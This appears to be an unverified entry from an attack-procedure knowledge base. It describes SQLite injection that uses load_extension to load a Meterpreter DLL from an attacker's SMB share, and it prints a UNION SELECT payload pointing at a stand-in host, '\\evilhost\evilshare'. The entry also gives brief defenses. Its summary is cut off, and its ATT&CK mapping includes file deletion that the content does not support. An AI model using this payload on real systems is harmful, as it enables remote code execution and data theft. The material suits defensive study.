---
id: a8908220-2655-4e60-b7c0-37c6affcf57f
name: SQLite Injection - Remote Command Execution using Load_extension
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:37.174328+00:00'
updated_at: '2023-04-10T20:24:33.019540+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Exploitation for Client Execution|T1203 - Exploitation for Client Execution]]'
- '[[Indicator Removal on Host|T1070 - Indicator Removal on Host]]'
sub_techniques:
- '[[File Deletion|T1070.004 - File Deletion]]'
tags:
- '[[Remote Command Execution using SQLite command - Load_extension]]'
- '[[SQLite Injection]]'
---

# SQLite Injection - Remote Command Execution using Load_extension

## Summary

SQLite is a popular database engine used in many applications. In this procedure, an attacker exploits a vulnerability in the application's use of SQLite to inject a Meterpreter DLL, which can then be used to achieve remote command execution. The attacker uses the SQLite command Load_extension to l

## Description

# Description

SQLite is a popular database engine used in many applications. In this procedure, an attacker exploits a vulnerability in the application's use of SQLite to inject a Meterpreter DLL, which can then be used to achieve remote command execution. The attacker uses the SQLite command Load_extension to load the DLL and execute commands on the target system. This technique can be used to gain a foothold in the target network and move laterally to other systems.

Technical Explanation: An attacker can use a specially crafted SQLite query to inject a Meterpreter DLL into the target system. The attacker then uses the Load_extension command to load the DLL and execute commands on the target system. This technique can be used to bypass application-level security controls and gain access to sensitive data.

Business Value: This procedure can be used by attackers to gain access to sensitive data and intellectual property. It can also be used to disrupt business operations and cause financial harm to the target organization.

## Requirements

1. Access to the target application

1. Knowledge of the application's use of SQLite

1. Ability to craft a specially crafted SQLite query

1. Meterpreter DLL

## Defense

1. Implement input validation and sanitization to prevent SQL injection attacks

1. Limit the privileges of the user account used by the application

1. Monitor for suspicious activity, such as the use of Load_extension command

## Objectives

1. Inject a Meterpreter DLL into the target system

1. Achieve remote command execution on the target system

1. Gain access to sensitive data and intellectual property

# Instructions

1. This command is used to inject a Meterpreter DLL using SQL Injection. The 'load_extension' function is used to load the Meterpreter DLL from the attacker's machine via SMB share. The 'DllMain' parameter is used to specify the entry point for the DLL.

**Code**: [[UNION SELECT 1,load_extension('\\evilhost\evilshar]]

> The 'UNION SELECT' statement is used to combine the result sets of two or more SELECT statements into a single result set. In this case, the '1' is used to match the number of columns in the original SELECT statement. The injected code then uses the 'load_extension' function to load the Meterpreter DLL from the attacker's machine via SMB share. The '\\evilhost\evilshare\meterpreter.dll' parameter specifies the path to the DLL on the attacker's machine. The 'DllMain' parameter is used to specify the entry point for the DLL. This command can be used to gain unauthorized access to a vulnerable system.

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]

### Techniques

- [[Exploitation for Client Execution|T1203 - Exploitation for Client Execution]]
- [[Indicator Removal on Host|T1070 - Indicator Removal on Host]]

### Sub-Techniques

- [[File Deletion|T1070.004 - File Deletion]]

## Tags

- [[Remote Command Execution using SQLite command - Load_extension]]
- [[SQLite Injection]]
